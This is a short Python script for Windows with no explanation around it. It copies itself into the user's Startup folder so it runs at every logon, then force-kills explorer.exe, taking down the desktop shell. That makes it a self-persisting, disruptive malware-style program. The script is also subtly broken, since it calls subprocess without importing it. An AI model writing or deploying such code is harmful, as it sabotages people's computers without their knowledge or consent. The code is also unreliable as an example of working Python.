import os
import shutil
import sys

startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

script_name = os.path.basename(sys.argv[0])

def is_file_in_startup_folder(startup_folder, file_name):
    return file_name in os.listdir(startup_folder)

def copy_self_to_startup(startup_folder, script_path, script_name):
    destination_path = os.path.join(startup_folder, script_name)
    shutil.copyfile(script_path, destination_path)
    print(f"Copied {script_name} to {destination_path}")

script_path = os.path.realpath(sys.argv[0])

if is_file_in_startup_folder(startup_folder, script_name):
    pass
else:
    copy_self_to_startup(startup_folder, script_path, script_name)

subprocess.run(['taskkill','/im','explorer.exe','/f'])